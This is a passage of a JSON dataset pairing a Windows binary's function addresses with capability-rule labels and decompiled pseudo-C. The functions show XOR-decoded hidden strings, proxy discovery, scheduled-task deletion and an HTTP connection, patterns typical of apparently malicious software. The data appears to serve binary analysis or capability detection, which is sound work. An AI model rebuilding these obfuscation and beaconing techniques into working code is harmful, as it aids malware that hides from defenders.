fcn.0040b4ff();\n                    fcn.0040b27a();\n                    uVar3 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    break;\n                }\n            }\n            uVar3 = (*pcVar2)(0, iVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            puVar4 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_14h = var_14h + 1;\n    } while (var_ch < 0x41ca50);\n    iVar9 = *var_60h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return iVar9 != 0;\n}\n",
        "token_count": 1804
    },
    "0040981b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040981b(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.0040a831();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 276
    },
    "0040aa6a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040aa6a(uint param_1, uchar *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    int32_t var_28h;\n    uchar *psz1;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    puVar10 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar10 = &pszFile;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar6 != 0) && (iVar6 = fcn.0040aa16(),  iVar6 != 0)) {\n        iVar6 = 6;\n        uVar8 = 1;\n        var_44h = 6;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar4 != 0)) {\n            puVar10 = &pAutoProxyOptions;\n            for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            if (pProxyConfig != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 1;\n                var_58h = var_58h | 1;\n            }\n            if (var_38h != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 2;\n                var_54h = var_38h;\n            }\n            var_48h = 1;\n            puVar10 = &pProxyInfo;\n            for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar4, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar6 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n                pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar2)(var_8h);\n                }\n                goto code_r0x0040ad42;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar2)(var_8h);\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x0040abe0:\n                iVar6 = var_34h;\n                iVar4 = fcn.00403552();\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar4 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar6);\n                    goto code_r0x0040ad42;\n                }\n                pProxyInfo = 0x6f303229;\n                psz2 = 0x4442413c;\n                var_8h = 0x327b481c;\n                var_4h._0_2_ = 0x6f44;\n                var_1ch = 0x6f443241;\n                var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x48);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                pszSrch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_28h = &pProxyInfo - pszSrch;\n                var_14h = 0;\n                do {\n                    var_40h = 5;\n                    *(var_14h + pszSrch) = *(&var_1ch + var_14h % 5) ^ (var_14h + pszSrch)[var_28h];\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x673a7a5d;\n                psz2 = 0x7a456111;\n                var_8h = 0x6165673d;\n                var_1ch = 0x674e7a35;\n                var_18h._0_2_ = 0x6165;\n                uVar8 = (*pcVar2)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar6 = pszSrch;\n                iVar9 = 0;\n                var_28h = &pProxyInfo - iVar4;\n                do {\n                    puVar1 = iVar9 + iVar4;\n                    iVar7 = iVar9 % var_44h;\n                    iVar9 = iVar9 + 1;\n                    *puVar1 = *(&var_1ch + iVar7) ^ puVar1[var_28h];\n                } while (iVar9 < 0xc);\n                iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar9 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.004034c5(&var_14h);\n                uVar8 = 1;\n                while (pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar4);\n                    if ((pszSrch == (iVar9 == lpcwszUrl)) && (iVar9 = fcn.00403552(),  iVar9 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar9 + 2);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        (*pcVar2)(uVar5);\n                        goto code_r0x0040ad42;\n                    }\n                    lpcwszUrl = fcn.004034c5(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar2)(0, iVar6);\n                (*pcVar3)(uVar8);\n            }\n            else {\n                do {\n                    iVar6 = fcn.004034c5(&var_14h);\n                    if (iVar6 == 0) goto code_r0x0040abe0;\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar6);\n                } while (iVar6 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x0040ad42:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar2)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar2)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2243
    },
    "0040ad9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ad9e(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int16_t *piVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t *piVar10;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int16_t *var_ch;\n    int32_t pszFirst;\n    uint var_4h;\n    \n    var_30h = 0x4658622f;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x34404b18;\n    var_28h = 0x624b746a;\n    pszFirst = 0x4634624b;\n    var_4h._0_1_ = 0x74;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    do {\n        var_24h = 5;\n        puVar1 = iVar8 + piVar6;\n        iVar7 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&pszFirst + iVar7) ^ puVar1[&var_30h - piVar6];\n    } while (iVar8 < 0xc);\n    iVar8 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar8) {\n        iVar8 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x410310, 0, 1, 0x410320, &ppv);\n        if ((-1 < iVar8) && (ppv != NULL)) {\n            iVar8 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar8) && (var_20h != NULL)) {\n                iVar8 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar3 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar8 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar5 = *(var_1ch + var_10h * 4);\n                        var_24h = uVar5;\n                        iVar8 = (**(*ppv + 0x18))(ppv, uVar5, 0x410330, &var_18h);\n                        if ((-1 < iVar8) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_ch = NULL;\n                            iVar8 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar8) && (pszFirst != 0)) {\n                                iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41cad8);\n                                if ((iVar8 != 0) &&\n                                   ((iVar8 = (**(*var_18h + 0x8c))(var_18h, &var_ch),  -1 < iVar8 && (var_ch != NULL))))\n                                {\n                                    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_ch, piVar6);\n                                    piVar4 = var_ch;\n                                    if ((iVar8 != 0) &&\n                                       (((*var_ch == 0x22 && (var_ch[2] == 0x3a)) && (var_ch[3] == 0x5c)))) {\n                                        puVar9 = &lpFileName;\n                                        for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n                                            *puVar9 = 0;\n                                            puVar9 = puVar9 + 1;\n                                        }\n                                        piVar10 = piVar6;\n                                        do {\n                                            iVar2 = *piVar10;\n                                            piVar10 = piVar10 + 1;\n                                        } while (iVar2 != var_34h);\n                                        iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar4, piVar6);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_ch + 1, \n                                                   ((iVar8 - var_ch >> 1) - 2) + (piVar10 - (piVar6 + 1) >> 1));\n                                        iVar8 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar5 = var_24h;\n                                        if (iVar8 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar3)(var_ch);\n                                }\n                                (*pcVar3)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar3)(uVar5);\n                    } while (var_10h != 0);\n                    (*pcVar3)(var_1ch);\n                    iVar8 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    return;\n}\n",
        "token_count": 1421
    },
    "0040b4ff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b4ff(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "0040be78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040be78(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    code *pcVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uint32_t in_EDX;\n    int32_t iVar10;\n    uint32_t uVar11;\n    code *pcVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpFindFileData;\n    int32_t lpBuffer;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar13 = 0;\n    var_24h = 0;\n    var_34h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    if (lpFindFileData == 0) {\n        return 0;\n    }\n    uVar5 = (*pcVar12)(8, 0x208);\n    lpBuffer = (*pcVar4)(uVar5);\n    if (lpBuffer == 0) goto code_r0x0040c12a;\n    uVar5 = (*pcVar12)(8, 0x208);\n    lpMem = (*pcVar4)(uVar5);\n    if (lpMem != NULL) {\n        var_48h = 0x775a620b;\n        var_44h = 0x62325166;\n        var_40h = 0x512d7708;\n        piVar6 = lpMem;\n        for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_3ch._0_2_ = 0x6257;\n        var_30h = 0x77706257;\n        var_2ch._0_2_ = 0x5148;\n        uVar5 = (*pcVar12)(8, 0x1d);\n        piVar6 = (*pcVar4)(uVar5);\n        iVar8 = lpBuffer;\n        iVar14 = 0;\n        var_38h = piVar6;\n        do {\n            var_20h = 6;\n            puVar1 = iVar14 + piVar6;\n            iVar10 = iVar14 % 6;\n            iVar14 = iVar14 + 1;\n            *puVar1 = *(&var_30h + iVar10) ^ puVar1[&var_48h - piVar6];\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        } while (iVar14 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar2 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar2 != 0);\n        iVar14 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar14 == 0) {\ncode_r0x0040c0fc:\n            uVar5 = (*pcVar12)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar13 = var_34h;\n        }\n        else {\n            if (var_18h == 0) {\n                var_1ch = fcn.00401000();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.00401000();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar8, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar8, lpFindFileData);\n            if (var_18h == -1) goto code_r0x0040c0fc;\n            iVar8 = lpFindFileData;\n            iVar14 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar10 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar8 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar10 + (-0x2c - iVar8) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar2 != var_24h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_28h = iVar8 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar10 = var_28h - piVar6;\n                        uVar7 = var_20h;\n                        uVar11 = var_34h;\n                        do {\n                            iVar8 = lpFindFileData;\n                            iVar14 = lpBuffer;\n                            if (uVar11 == 0) break;\n                            *piVar6 = uVar7;\n                            piVar6 = piVar6 + 1;\n                            uVar11 = uVar11 - 1;\n                            uVar3 = *(iVar10 + piVar6);\n                            uVar7 = uVar3;\n                        } while (uVar3 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_30h = var_34h;\n                }\n                iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar8);\n                if (iVar10 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar14, iVar8);\n                }\n            }\n            *arg_10h = lpMem;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = var_38h;\n            uVar13 = 1;\n        }\n        uVar5 = (*pcVar12)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    uVar5 = (*pcVar12)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\ncode_r0x0040c12a:\n    uVar5 = (*pcVar12)(0, lpFindFileData);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    return uVar13;\n}\n",
        "token_count": 1962
    },
    "0040ca64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nushort * __cdecl\nfcn.0040ca64(ushort *lpdwNumberOfBytesAvailable, uint *lpdwNumberOfBytesRead, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t arg_18h)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t *in_EDX;\n    int32_t iVar5;\n    int32_t iVar6;\n    ushort *puVar7;\n    code *pcVar8;\n    uint var_418h;\n    uint lpszHeaders;\n    uint var_110h;\n    uint var_10ch;\n    int32_t var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    int32_t var_f8h;\n    int32_t var_f4h;\n    int32_t var_f0h;\n    uint lpdwBufferLength;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    int32_t *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *hRequest;\n    int32_t lpMultiByteStr;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_13h;\n    uint var_fh;\n    uint *var_8h;\n    uint var_4h;\n    \n    puVar3 = &lpszHeaders;\n    var_44h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar4 = 0x100; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_418h;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (lpdwNumberOfBytesAvailable == 0x40) {\n        var_fch = 0;\n        var_100h = 0x34367964;\ncode_r0x0040cad9:\n        var_104h = 0x6f62722f;\n    }\n    else {\n        if (lpdwNumberOfBytesAvailable == 0x20) {\n            var_fch = 0;\ncode_r0x0040cacf:\n            var_100h = 0x32337964;\n            goto code_r0x0040cad9;\n        }\n        if (lpdwNumberOfBytesAvailable == 0x140) {\n            var_fch = 0x30;\n            goto code_r0x0040cacf;\n        }\n    }\n    hRequest = &var_104h;\n    if (lpdwNumberOfBytesRead != NULL) {\n        hRequest = lpdwNumberOfBytesRead;\n    }\n    iVar4 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar4 == 0) {\n        return 0x3;\n    }\n    lpdwNumberOfBytesRead = 0x6;\n    if (*0x41cda0 == 0) {\n        var_e8h = 0x31034a1a;\n        var_e4h = 0x4a3e561e;\n        var_e0h = 0x56083100;\n        var_dch = 0x31434a36;\n        var_d8h = 0x4a795651;\n        var_d4h = 0x5644315c;\n        var_d0h = 0x313b4a7f;\n        var_cch = 0x4a39560d;\n        var_c8h = 0x560b3108;\n        var_c4h = 0x311f4a20;\n        var_c0h = 0x4a195644;\n        var_bch = 0x56443138;\n        var_b8h = 0x31424a61;\n        var_b4h = 0x4a6c5655;\n        var_b0h = 0x5633314c;\n        var_ach = 0x31024a3e;\n        var_a8h = 0x4a635652;\n        var_a4h = 0x56443157;\n        var_a0h = 0x315a4a2f;\n        var_9ch = 0x4a6c5650;\n        var_98h = 0x5616314c;\n        var_94h = 0x31564a21;\n        var_90h = 0x4a625656;\n        var_8ch = 0x56543142;\n        var_88h = 0x314c4a7e;\n        var_84h = 0x4a325623;\n        var_80h = 0x560f310f;\n        var_7ch = 0x31434a38;\n        var_78h = 0x4a665656;\n        var_74h = 0x5654315c;\n        var_70h = 0x315d4a67;\n        var_6ch = 0x4a665654;\n        var_68h = 0x5622314c;\n        var_64h = 0x311e4a3e;\n        var_60h._0_1_ = 1;\n        stack0xffffff9d = 0x34a3156;\n        var_5bh = 0x78561c31;\n        var_57h = 0x51315e4a;\n        var_53h = 0x5c4a7956;\n        var_4fh._0_2_ = 0x6431;\n        var_4fh._2_1_ = 0x56;\n        var_8h = 0x316c4a57;\n        var_4h = CONCAT22(var_4h._2_2_, 0x5664);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        lpdwNumberOfBytesAvailable = &var_e8h - iVar4;\n        do {\n            puVar1 = iVar6 + iVar4;\n            iVar5 = iVar6 % lpdwNumberOfBytesRead;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_8h + iVar5) ^ puVar1[lpdwNumberOfBytesAvailable];\n        } while (iVar6 < 0x9c);\n        *0x41cda0 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar4, 0, 0, 0, 0);\n        if (*0x41cda0 == 0) {\n            uVar2 = (*pcVar8)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return 0x1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41cda0, 5000, 5000, 5000, 5000);\n        uVar2 = (*pcVar8)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar2 = (*pcVar8)(8, (iVar4 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                  (0, 0, lpMultiByteStr, 0xffffffff, lpdwNumberOfBytesAvailable, iVar4 + 1);\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41cda0, lpdwNumberOfBytesAvailable, 0x50, 0);\n    var_2ch = 0x37073401;\n    _var_28h = 0x73446941;\n    stack0xffffffd8 = 0x34533544;\n    stack0xffffffdc = 0x691a375c;\n    stack0xffffffe0 = 0x35447311;\n    stack0xffffffe4 = 0x37563453;\n    stack0xffffffe8 = 0x731b6951;\n    var_13h._3_1_ = 0x37;\n    var_fh._0_1_ = 